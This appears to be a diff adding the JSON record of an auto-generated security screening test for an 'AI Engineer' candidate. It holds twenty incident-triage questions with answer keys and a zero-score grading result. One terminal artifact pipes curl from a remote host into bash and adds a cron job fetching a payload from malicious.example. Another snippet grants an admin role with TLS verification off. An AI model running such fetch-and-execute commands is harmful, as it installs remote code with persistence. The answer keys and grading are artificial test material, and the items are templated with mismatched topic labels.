@@ -1,0 +1,1335 @@
+{
+  "session_id": "bc68737a-f42c-4eb3-9811-580cfe23ba45",
+  "candidate_name": "John Doe",
+  "job_title": "AI Engineer",
+  "job_description": "AI Engineer\n\nSkills:\n- Python\n- Machine Learning\n- Deep Learning\n- TensorFlow\n- PyTorch\n- SQL\n- Git\n\nResponsibilities:\n- Build AI models.\n- Train models.\n- Analyze data.\n- Improve AI performance.",
+  "department": "Cybersecurity",
+  "status": "graded",
+  "duration_minutes": 45,
+  "started_at": "2026-07-25T07:10:13.167711+00:00",
+  "submitted_at": "2026-07-25T07:10:24.292212+00:00",
+  "questions": [
+    {
+      "id": "q1",
+      "type": "code_analysis",
+      "bucket": "technical",
+      "category": "Python",
+      "difficulty": "medium",
+      "skill_tested": "Python",
+      "prompt": "What is the most critical security issue in this Python-related code snippet?",
+      "points": 5,
+      "explanation": "The correct response aligns with Python best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "The correct response aligns with Python best practices for the described situation.",
+      "artifact": "import requests\n\nurl = 'https://api.internal.local/v1/users/kpatel'\npayload = {'role': 'admin', 'active': True}\nresponse = requests.post(url, json=payload, verify=False)\nprint(response.status_code, response.text)",
+      "options": [
+        "D) Printing response status code to stdout",
+        "A) Missing pagination in the API response",
+        "B) TLS verification disabled and privileged role assignment without authorization checks",
+        "C) Use of JSON instead of XML"
+      ],
+      "correct_answer": "B) TLS verification disabled and privileged role assignment without authorization checks"
+    },
+    {
+      "id": "q2",
+      "type": "aptitude",
+      "bucket": "aptitude",
+      "category": "Python",
+      "difficulty": "medium",
+      "skill_tested": "SQL",
+      "prompt": "A team must prioritize five SQL tasks with limited staff. Which approach best reflects strong operational judgment?",
+      "points": 5,
+      "explanation": "The correct response aligns with SQL best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "The correct response aligns with SQL best practices for the described situation.",
+      "options": [
+        "A) Handle tasks alphabetically",
+        "D) Wait for all stakeholders to agree before any action",
+        "B) Prioritize by business impact, exploitability, and evidence strength",
+        "C) Close oldest tickets regardless of severity"
+      ],
+      "correct_answer": "B) Prioritize by business impact, exploitability, and evidence strength"
+    },
+    {
+      "id": "q3",
+      "type": "match_following",
+      "bucket": "technical",
+      "category": "SQL",
+      "difficulty": "medium",
+      "skill_tested": "SQL",
+      "prompt": "Match each SQL term to its best description.",
+      "points": 5,
+      "explanation": "The correct response aligns with SQL best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "The correct response aligns with SQL best practices for the described situation.",
+      "match_pairs": [
+        {
+          "id": "m1",
+          "left": "SIEM",
+          "correct_right": "Centralized log correlation and alerting platform"
+        },
+        {
+          "id": "m2",
+          "left": "IOC",
+          "correct_right": "Artifact indicating potential compromise"
+        },
+        {
+          "id": "m3",
+          "left": "MTTR",
+          "correct_right": "Mean time to remediate or respond"
+        },
+        {
+          "id": "m4",
+          "left": "EDR",
+          "correct_right": "Endpoint telemetry and response tooling"
+        }
+      ],
+      "options": [],
+      "match_options": [
+        "Artifact indicating potential compromise",
+        "Mean time to remediate or respond",
+        "Centralized log correlation and alerting platform",
+        "Endpoint telemetry and response tooling"
+      ]
+    },
+    {
+      "id": "q4",
+      "type": "multi_select",
+      "bucket": "technical",
+      "category": "Python",
+      "difficulty": "medium",
+      "skill_tested": "Python",
+      "prompt": "Which actions are appropriate when investigating a Python alert tied to user alee from 10.248.249.159? Select all that apply.",
+      "points": 5,
+      "explanation": "The correct response aligns with Python best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "The correct response aligns with Python best practices for the described situation.",
+      "correct_answer": [
+        "D) Check for lateral movement indicators",
+        "B) Preserve volatile evidence before major system changes",
+        "A) Review authentication and process logs for the account"
+      ],
+      "options": [
+        "D) Check for lateral movement indicators",
+        "B) Preserve volatile evidence before major system changes",
+        "E) Disable monitoring to reduce noise",
+        "A) Review authentication and process logs for the account",
+        "C) Delete logs to save storage"
+      ]
+    },
+    {
+      "id": "q5",
+      "type": "code_analysis",
+      "bucket": "technical",
+      "category": "SQL",
+      "difficulty": "medium",
+      "skill_tested": "SQL",
+      "prompt": "What is the most critical security issue in this SQL-related code snippet?",
+      "points": 5,
+      "explanation": "The correct response aligns with SQL best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "The correct response aligns with SQL best practices for the described situation.",
+      "artifact": "import requests\n\nurl = 'https://api.internal.local/v1/users/kpatel'\npayload = {'role': 'admin', 'active': True}\nresponse = requests.post(url, json=payload, verify=False)\nprint(response.status_code, response.text)",
+      "options": [
+        "B) TLS verification disabled and privileged role assignment without authorization checks",
+        "C) Use of JSON instead of XML",
+        "A) Missing pagination in the API response",
+        "D) Printing response status code to stdout"
+      ],
+      "correct_answer": "B) TLS verification disabled and privileged role assignment without authorization checks"
+    },
+    {
+      "id": "q6",
+      "type": "threat_hunting",
+      "bucket": "scenario",
+      "category": "Python",
+      "difficulty": "medium",
+      "skill_tested": "Python",
+      "prompt": "You suspect lateral movement related to Python after seeing connections from host-8050ed.corp.local to 138.111.120.119. Describe a structured threat hunt.",
+      "points": 5,
+      "explanation": "The correct response aligns with Python best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "Evaluate evidence validation, prioritization, containment, communication, documentation, and role-aligned tooling for partial or full credit.",
+      "sample_answer": "Validate alerts, scope affected accounts and hosts, preserve evidence, contain confirmed threats, escalate to stakeholders, and document findings with next steps.",
+      "options": []
+    },
+    {
+      "id": "q7",
+      "type": "terminal_analysis",
+      "bucket": "technical",
+      "category": "Python",
+      "difficulty": "medium",
+      "skill_tested": "Python",
+      "prompt": "Based on this terminal session, what attack behavior is most likely occurring?",
+      "points": 5,
+      "explanation": "The correct response aligns with Python best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "The correct response aligns with Python best practices for the described situation.",
+      "artifact": "$ whoami\nkpatel\n$ curl -s http://14.184.29.193/setup.sh | bash\n$ crontab -l\n*/5 * * * * curl -s http://malicious.example/payload | sh",
+      "options": [
+        "A) Benign software update",
+        "C) Normal backup job execution",
+        "D) Expected package manager activity",
+        "B) Remote payload retrieval with scheduled persistence"
+      ],
+      "correct_answer": "B) Remote payload retrieval with scheduled persistence"
+    },
+    {
+      "id": "q8",
+      "type": "log_analysis",
+      "bucket": "technical",
+      "category": "SQL",
+      "difficulty": "medium",
+      "skill_tested": "SQL",
+      "prompt": "Which interpretation best fits this SQL log sequence?",
+      "points": 5,
+      "explanation": "The correct response aligns with SQL best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "The correct response aligns with SQL best practices for the described situation.",
+      "artifact": "2026-03-18T02:14:22Z host=host-ebf8af.corp.local src=10.189.221.53 dst=126.149.217.219 user=devans event=LogonProcess auth=Negotiate status=0x0\n2026-03-18T02:14:24Z host=host-ebf8af.corp.local src=10.189.221.53 dst=126.149.217.219 user=devans event=SeDebugPrivilege status=success\n2026-03-18T02:14:29Z host=host-ebf8af.corp.local src=10.189.221.53 event=PowerShellScriptBlock id=2f12b41f082931b6 signed=false",
+      "options": [
+        "C) Failed login brute force only",
+        "D) DNS misconfiguration",
+        "B) Privilege use followed by potentially suspicious script execution",
+        "A) Routine scheduled maintenance"
+      ],
+      "correct_answer": "B) Privilege use followed by potentially suspicious script execution"
+    },
+    {
+      "id": "q9",
+      "type": "true_false",
+      "bucket": "technical",
+      "category": "Python",
+      "difficulty": "medium",
+      "skill_tested": "Python",
+      "prompt": "True or False: For Python, blocking 136.131.160.51 without investigation is always sufficient to close an incident.",
+      "points": 5,
+      "explanation": "The correct response aligns with Python best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "The correct response aligns with Python best practices for the described situation.",
+      "options": [
+        "False",
+        "True"
+      ],
+      "correct_answer": "False"
+    },
+    {
+      "id": "q10",
+      "type": "multi_select",
+      "bucket": "technical",
+      "category": "SQL",
+      "difficulty": "medium",
+      "skill_tested": "SQL",
+      "prompt": "Which actions are appropriate when investigating a SQL alert tied to user devans from 10.140.197.179? Select all that apply.",
+      "points": 5,
+      "explanation": "The correct response aligns with SQL best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "The correct response aligns with SQL best practices for the described situation.",
+      "correct_answer": [
+        "A) Review authentication and process logs for the account",
+        "D) Check for lateral movement indicators",
+        "B) Preserve volatile evidence before major system changes"
+      ],
+      "options": [
+        "A) Review authentication and process logs for the account",
+        "C) Delete logs to save storage",
+        "D) Check for lateral movement indicators",
+        "B) Preserve volatile evidence before major system changes",
+        "E) Disable monitoring to reduce noise"
+      ]
+    },
+    {
+      "id": "q11",
+      "type": "scenario",
+      "bucket": "scenario",
+      "category": "SQL",
+      "difficulty": "medium",
+      "skill_tested": "SQL",
+      "prompt": "At 02:20 UTC, monitoring detects abnormal authentication for kpatel from 1.168.169.41 followed by access to a sensitive SQL system. Describe your investigation and containment plan for the first 30 minutes.",
+      "points": 5,
+      "explanation": "The correct response aligns with SQL best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "Evaluate evidence validation, prioritization, containment, communication, documentation, and role-aligned tooling for partial or full credit.",
+      "sample_answer": "Validate alerts, scope affected accounts and hosts, preserve evidence, contain confirmed threats, escalate to stakeholders, and document findings with next steps.",
+      "options": []
+    },
+    {
+      "id": "q12",
+      "type": "scenario",
+      "bucket": "scenario",
+      "category": "Python",
+      "difficulty": "medium",
+      "skill_tested": "Python",
+      "prompt": "At 02:20 UTC, monitoring detects abnormal authentication for mchen from 154.101.111.103 followed by access to a sensitive Python system. Describe your investigation and containment plan for the first 30 minutes.",
+      "points": 5,
+      "explanation": "The correct response aligns with Python best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "Evaluate evidence validation, prioritization, containment, communication, documentation, and role-aligned tooling for partial or full credit.",
+      "sample_answer": "Validate alerts, scope affected accounts and hosts, preserve evidence, contain confirmed threats, escalate to stakeholders, and document findings with next steps.",
+      "options": []
+    },
+    {
+      "id": "q13",
+      "type": "mcq",
+      "bucket": "technical",
+      "category": "Python",
+      "difficulty": "medium",
+      "skill_tested": "Python",
+      "prompt": "During review of activity involving Python, analysts observe a connection from 1.63.155.102 to 148.87.7.88 associated with CVE-2023-92681. What is the best immediate action?",
+      "points": 5,
+      "explanation": "The correct response aligns with Python best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "The correct response aligns with Python best practices for the described situation.",
+      "options": [
+        "D) Publish the IOC publicly before internal verification",
+        "C) Reboot all servers in the subnet immediately",
+        "A) Ignore the alert until business hours",
+        "B) Validate the alert, isolate affected assets if confirmed, and preserve evidence"
+      ],
+      "correct_answer": "B) Validate the alert, isolate affected assets if confirmed, and preserve evidence"
+    },
+    {
+      "id": "q14",
+      "type": "aptitude",
+      "bucket": "aptitude",
+      "category": "SQL",
+      "difficulty": "medium",
+      "skill_tested": "Python",
+      "prompt": "A team must prioritize five Python tasks with limited staff. Which approach best reflects strong operational judgment?",
+      "points": 5,
+      "explanation": "The correct response aligns with Python best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "The correct response aligns with Python best practices for the described situation.",
+      "options": [
+        "B) Prioritize by business impact, exploitability, and evidence strength",
+        "D) Wait for all stakeholders to agree before any action",
+        "C) Close oldest tickets regardless of severity",
+        "A) Handle tasks alphabetically"
+      ],
+      "correct_answer": "B) Prioritize by business impact, exploitability, and evidence strength"
+    },
+    {
+      "id": "q15",
+      "type": "true_false",
+      "bucket": "technical",
+      "category": "SQL",
+      "difficulty": "medium",
+      "skill_tested": "SQL",
+      "prompt": "True or False: For SQL, blocking 220.196.123.67 without investigation is always sufficient to close an incident.",
+      "points": 5,
+      "explanation": "The correct response aligns with SQL best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "The correct response aligns with SQL best practices for the described situation.",
+      "options": [
+        "False",
+        "True"
+      ],
+      "correct_answer": "False"
+    },
+    {
+      "id": "q16",
+      "type": "incident_response",
+      "bucket": "scenario",
+      "category": "SQL",
+      "difficulty": "medium",
+      "skill_tested": "SQL",
+      "prompt": "A host at 10.214.255.167 is flagged for malware linked to CVE-2023-45777. Outline your incident response steps from detection through recovery.",
+      "points": 5,
+      "explanation": "The correct response aligns with SQL best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "Evaluate evidence validation, prioritization, containment, communication, documentation, and role-aligned tooling for partial or full credit.",
+      "sample_answer": "Validate alerts, scope affected accounts and hosts, preserve evidence, contain confirmed threats, escalate to stakeholders, and document findings with next steps.",
+      "options": []
+    },
+    {
+      "id": "q17",
+      "type": "match_following",
+      "bucket": "technical",
+      "category": "Python",
+      "difficulty": "medium",
+      "skill_tested": "Python",
+      "prompt": "Match each Python term to its best description.",
+      "points": 5,
+      "explanation": "The correct response aligns with Python best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "The correct response aligns with Python best practices for the described situation.",
+      "match_pairs": [
+        {
+          "id": "m1",
+          "left": "SIEM",
+          "correct_right": "Centralized log correlation and alerting platform"
+        },
+        {
+          "id": "m2",
+          "left": "IOC",
+          "correct_right": "Artifact indicating potential compromise"
+        },
+        {
+          "id": "m3",
+          "left": "MTTR",
+          "correct_right": "Mean time to remediate or respond"
+        },
+        {
+          "id": "m4",
+          "left": "EDR",
+          "correct_right": "Endpoint telemetry and response tooling"
+        }
+      ],
+      "options": [],
+      "match_options": [
+        "Endpoint telemetry and response tooling",
+        "Centralized log correlation and alerting platform",
+        "Mean time to remediate or respond",
+        "Artifact indicating potential compromise"
+      ]
+    },
+    {
+      "id": "q18",
+      "type": "mcq",
+      "bucket": "technical",
+      "category": "Python",
+      "difficulty": "medium",
+      "skill_tested": "Python",
+      "prompt": "During review of activity involving Python, analysts observe a connection from 56.169.204.89 to 196.96.11.112 associated with CVE-2026-91476. What is the best immediate action?",
+      "points": 5,
+      "explanation": "The correct response aligns with Python best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "The correct response aligns with Python best practices for the described situation.",
+      "options": [
+        "C) Reboot all servers in the subnet immediately",
+        "B) Validate the alert, isolate affected assets if confirmed, and preserve evidence",
+        "A) Ignore the alert until business hours",
+        "D) Publish the IOC publicly before internal verification"
+      ],
+      "correct_answer": "B) Validate the alert, isolate affected assets if confirmed, and preserve evidence"
+    },
+    {
+      "id": "q19",
+      "type": "fill_blank",
+      "bucket": "technical",
+      "category": "SQL",
+      "difficulty": "medium",
+      "skill_tested": "SQL",
+      "prompt": "A analyst needs to identify the host responsible for suspicious traffic to 208.29.194.29. The device MAC address is 54:2f:4d:03:21:84. Which command on a managed switch shows the port mapping?",
+      "points": 5,
+      "explanation": "The correct response aligns with SQL best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "The correct response aligns with SQL best practices for the described situation.",
+      "correct_answer": [
+        "show mac address-table",
+        "show mac-address-table",
+        "show mac address table"
+      ],
+      "options": []
+    },
+    {
+      "id": "q20",
+      "type": "mcq",
+      "bucket": "technical",
+      "category": "SQL",
+      "difficulty": "medium",
+      "skill_tested": "SQL",
+      "prompt": "During review of activity involving SQL, analysts observe a connection from 198.21.57.172 to 88.108.212.90 associated with CVE-2019-31728. What is the best immediate action?",
+      "points": 5,
+      "explanation": "The correct response aligns with SQL best practices for the described situation.",
+      "wrong_option_rationale": "Other options represent incomplete triage, unsafe actions, or misinterpretation of evidence.",
+      "references": [
+        "NIST SP 800-61",
+        "MITRE ATT&CK"
+      ],
+      "rubric": "The correct response aligns with SQL best practices for the described situation.",
+      "options": [
+        "A) Ignore the alert until business hours",
+        "B) Validate the alert, isolate affected assets if confirmed, and preserve evidence",
+        "C) Reboot all servers in the subnet immediately",
+        "D) Publish the IOC publicly before internal verification"
+      ],
+      "correct_answer": "B) Validate the alert, isolate affected assets if confirmed, and preserve evidence"
+    }
+  ],
+  "answers": {},
+  "submitted_late": false,
+  "late_seconds": 0,
+  "security_violations": 3,
+  "grading_result": {
+    "total_score": 0.0,
+    "max_score": 100.0,
+    "overall_percentage": 0.0,
+    "recommendation": "Do Not Proceed - significant gaps relative to role requirements.",
+    "category_breakdown": [
+      {
+        "category": "Python",
+        "score": 0.0,
+        "max_score": 50.0,
+        "percentage": 0.0
+      },
+      {
+        "category": "SQL",
+        "score": 0.0,
+        "max_score": 50.0,
+        "percentage": 0.0
+      }
+    ],
+    "question_results": [
+      {
+        "id": "q1",
+        "type": "code_analysis",
+        "category": "Python",
+        "prompt": "What is the most critical security issue in this Python-related code snippet?",
+        "answer": "",
+        "result": {
+          "score": 0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "Incorrect. Expected: B) TLS verification disabled and privileged role assignment without authorization checks",
+          "strengths": [],
+          "gaps": [
+            "Review the underlying concept in the rubric."
+          ],
+          "correct_answer": "B) TLS verification disabled and privileged role assignment without authorization checks"
+        }
+      },
+      {
+        "id": "q2",
+        "type": "aptitude",
+        "category": "Python",
+        "prompt": "A team must prioritize five SQL tasks with limited staff. Which approach best reflects strong operational judgment?",
+        "answer": "",
+        "result": {
+          "score": 0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "Incorrect. Expected: B) Prioritize by business impact, exploitability, and evidence strength",
+          "strengths": [],
+          "gaps": [
+            "Review the underlying concept in the rubric."
+          ],
+          "correct_answer": "B) Prioritize by business impact, exploitability, and evidence strength"
+        }
+      },
+      {
+        "id": "q3",
+        "type": "match_following",
+        "category": "SQL",
+        "prompt": "Match each SQL term to its best description.",
+        "answer": "",
+        "result": {
+          "score": 0.0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "Incorrect. Correct matches:\nSIEM -> Centralized log correlation and alerting platform\nIOC -> Artifact indicating potential compromise\nMTTR -> Mean time to remediate or respond\nEDR -> Endpoint telemetry and response tooling",
+          "strengths": [],
+          "gaps": [
+            "Mismatch in term assignments"
+          ],
+          "correct_answer": [
+            "SIEM -> Centralized log correlation and alerting platform",
+            "IOC -> Artifact indicating potential compromise",
+            "MTTR -> Mean time to remediate or respond",
+            "EDR -> Endpoint telemetry and response tooling"
+          ]
+        }
+      },
+      {
+        "id": "q4",
+        "type": "multi_select",
+        "category": "Python",
+        "prompt": "Which actions are appropriate when investigating a Python alert tied to user alee from 10.248.249.159? Select all that apply.",
+        "answer": "",
+        "result": {
+          "score": 0.0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "Incorrect. No options selected.",
+          "strengths": [],
+          "gaps": [
+            "Review the topic and select all correct choices."
+          ],
+          "correct_answer": [
+            "D) Check for lateral movement indicators",
+            "B) Preserve volatile evidence before major system changes",
+            "A) Review authentication and process logs for the account"
+          ]
+        }
+      },
+      {
+        "id": "q5",
+        "type": "code_analysis",
+        "category": "SQL",
+        "prompt": "What is the most critical security issue in this SQL-related code snippet?",
+        "answer": "",
+        "result": {
+          "score": 0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "Incorrect. Expected: B) TLS verification disabled and privileged role assignment without authorization checks",
+          "strengths": [],
+          "gaps": [
+            "Review the underlying concept in the rubric."
+          ],
+          "correct_answer": "B) TLS verification disabled and privileged role assignment without authorization checks"
+        }
+      },
+      {
+        "id": "q6",
+        "type": "threat_hunting",
+        "category": "Python",
+        "prompt": "You suspect lateral movement related to Python after seeing connections from host-8050ed.corp.local to 138.111.120.119. Describe a structured threat hunt.",
+        "answer": "",
+        "result": {
+          "score": 0.0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "No answer provided.",
+          "strengths": [],
+          "gaps": [
+            "Provide an answer to receive credit."
+          ]
+        }
+      },
+      {
+        "id": "q7",
+        "type": "terminal_analysis",
+        "category": "Python",
+        "prompt": "Based on this terminal session, what attack behavior is most likely occurring?",
+        "answer": "",
+        "result": {
+          "score": 0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "Incorrect. Expected: B) Remote payload retrieval with scheduled persistence",
+          "strengths": [],
+          "gaps": [
+            "Review the underlying concept in the rubric."
+          ],
+          "correct_answer": "B) Remote payload retrieval with scheduled persistence"
+        }
+      },
+      {
+        "id": "q8",
+        "type": "log_analysis",
+        "category": "SQL",
+        "prompt": "Which interpretation best fits this SQL log sequence?",
+        "answer": "",
+        "result": {
+          "score": 0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "Incorrect. Expected: B) Privilege use followed by potentially suspicious script execution",
+          "strengths": [],
+          "gaps": [
+            "Review the underlying concept in the rubric."
+          ],
+          "correct_answer": "B) Privilege use followed by potentially suspicious script execution"
+        }
+      },
+      {
+        "id": "q9",
+        "type": "true_false",
+        "category": "Python",
+        "prompt": "True or False: For Python, blocking 136.131.160.51 without investigation is always sufficient to close an incident.",
+        "answer": "",
+        "result": {
+          "score": 0.0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "Incorrect. Expected: False",
+          "strengths": [],
+          "gaps": [
+            "Review the concepts behind this True/False assertion."
+          ],
+          "correct_answer": "False"
+        }
+      },
+      {
+        "id": "q10",
+        "type": "multi_select",
+        "category": "SQL",
+        "prompt": "Which actions are appropriate when investigating a SQL alert tied to user devans from 10.140.197.179? Select all that apply.",
+        "answer": "",
+        "result": {
+          "score": 0.0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "Incorrect. No options selected.",
+          "strengths": [],
+          "gaps": [
+            "Review the topic and select all correct choices."
+          ],
+          "correct_answer": [
+            "A) Review authentication and process logs for the account",
+            "D) Check for lateral movement indicators",
+            "B) Preserve volatile evidence before major system changes"
+          ]
+        }
+      },
+      {
+        "id": "q11",
+        "type": "scenario",
+        "category": "SQL",
+        "prompt": "At 02:20 UTC, monitoring detects abnormal authentication for kpatel from 1.168.169.41 followed by access to a sensitive SQL system. Describe your investigation and containment plan for the first 30 minutes.",
+        "answer": "",
+        "result": {
+          "score": 0.0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "No answer provided.",
+          "strengths": [],
+          "gaps": [
+            "Provide an answer to receive credit."
+          ]
+        }
+      },
+      {
+        "id": "q12",
+        "type": "scenario",
+        "category": "Python",
+        "prompt": "At 02:20 UTC, monitoring detects abnormal authentication for mchen from 154.101.111.103 followed by access to a sensitive Python system. Describe your investigation and containment plan for the first 30 minutes.",
+        "answer": "",
+        "result": {
+          "score": 0.0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "No answer provided.",
+          "strengths": [],
+          "gaps": [
+            "Provide an answer to receive credit."
+          ]
+        }
+      },
+      {
+        "id": "q13",
+        "type": "mcq",
+        "category": "Python",
+        "prompt": "During review of activity involving Python, analysts observe a connection from 1.63.155.102 to 148.87.7.88 associated with CVE-2023-92681. What is the best immediate action?",
+        "answer": "",
+        "result": {
+          "score": 0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "Incorrect. Expected: B) Validate the alert, isolate affected assets if confirmed, and preserve evidence",
+          "strengths": [],
+          "gaps": [
+            "Review the underlying concept in the rubric."
+          ],
+          "correct_answer": "B) Validate the alert, isolate affected assets if confirmed, and preserve evidence"
+        }
+      },
+      {
+        "id": "q14",
+        "type": "aptitude",
+        "category": "SQL",
+        "prompt": "A team must prioritize five Python tasks with limited staff. Which approach best reflects strong operational judgment?",
+        "answer": "",
+        "result": {
+          "score": 0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "Incorrect. Expected: B) Prioritize by business impact, exploitability, and evidence strength",
+          "strengths": [],
+          "gaps": [
+            "Review the underlying concept in the rubric."
+          ],
+          "correct_answer": "B) Prioritize by business impact, exploitability, and evidence strength"
+        }
+      },
+      {
+        "id": "q15",
+        "type": "true_false",
+        "category": "SQL",
+        "prompt": "True or False: For SQL, blocking 220.196.123.67 without investigation is always sufficient to close an incident.",
+        "answer": "",
+        "result": {
+          "score": 0.0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "Incorrect. Expected: False",
+          "strengths": [],
+          "gaps": [
+            "Review the concepts behind this True/False assertion."
+          ],
+          "correct_answer": "False"
+        }
+      },
+      {
+        "id": "q16",
+        "type": "incident_response",
+        "category": "SQL",
+        "prompt": "A host at 10.214.255.167 is flagged for malware linked to CVE-2023-45777. Outline your incident response steps from detection through recovery.",
+        "answer": "",
+        "result": {
+          "score": 0.0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "No answer provided.",
+          "strengths": [],
+          "gaps": [
+            "Provide an answer to receive credit."
+          ]
+        }
+      },
+      {
+        "id": "q17",
+        "type": "match_following",
+        "category": "Python",
+        "prompt": "Match each Python term to its best description.",
+        "answer": "",
+        "result": {
+          "score": 0.0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "Incorrect. Correct matches:\nSIEM -> Centralized log correlation and alerting platform\nIOC -> Artifact indicating potential compromise\nMTTR -> Mean time to remediate or respond\nEDR -> Endpoint telemetry and response tooling",
+          "strengths": [],
+          "gaps": [
+            "Mismatch in term assignments"
+          ],
+          "correct_answer": [
+            "SIEM -> Centralized log correlation and alerting platform",
+            "IOC -> Artifact indicating potential compromise",
+            "MTTR -> Mean time to remediate or respond",
+            "EDR -> Endpoint telemetry and response tooling"
+          ]
+        }
+      },
+      {
+        "id": "q18",
+        "type": "mcq",
+        "category": "Python",
+        "prompt": "During review of activity involving Python, analysts observe a connection from 56.169.204.89 to 196.96.11.112 associated with CVE-2026-91476. What is the best immediate action?",
+        "answer": "",
+        "result": {
+          "score": 0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "Incorrect. Expected: B) Validate the alert, isolate affected assets if confirmed, and preserve evidence",
+          "strengths": [],
+          "gaps": [
+            "Review the underlying concept in the rubric."
+          ],
+          "correct_answer": "B) Validate the alert, isolate affected assets if confirmed, and preserve evidence"
+        }
+      },
+      {
+        "id": "q19",
+        "type": "fill_blank",
+        "category": "SQL",
+        "prompt": "A analyst needs to identify the host responsible for suspicious traffic to 208.29.194.29. The device MAC address is 54:2f:4d:03:21:84. Which command on a managed switch shows the port mapping?",
+        "answer": "",
+        "result": {
+          "score": 0.0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "Incorrect. Expected: show mac address-table",
+          "strengths": [],
+          "gaps": [
+            "Review the required terminology (Expected: show mac address-table)."
+          ],
+          "correct_answer": "show mac address-table"
+        }
+      },
+      {
+        "id": "q20",
+        "type": "mcq",
+        "category": "SQL",
+        "prompt": "During review of activity involving SQL, analysts observe a connection from 198.21.57.172 to 88.108.212.90 associated with CVE-2019-31728. What is the best immediate action?",
+        "answer": "",
+        "result": {
+          "score": 0,
+          "max_score": 5,
+          "percentage": 0.0,
+          "feedback": "Incorrect. Expected: B) Validate the alert, isolate affected assets if confirmed, and preserve evidence",
+          "strengths": [],
+          "gaps": [
+            "Review the underlying concept in the rubric."
+          ],
+          "correct_answer": "B) Validate the alert, isolate affected assets if confirmed, and preserve evidence"
+        }
+      }
+    ]
+  },
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "date": "2026-07-25T07:10:24.292212+00:00",
+      "score": 0.0,
+      "max_score": 100.0,
+      "percentage": 0.0,
+      "answers": {},
+      "grading_result": {
+        "total_score": 0.0,
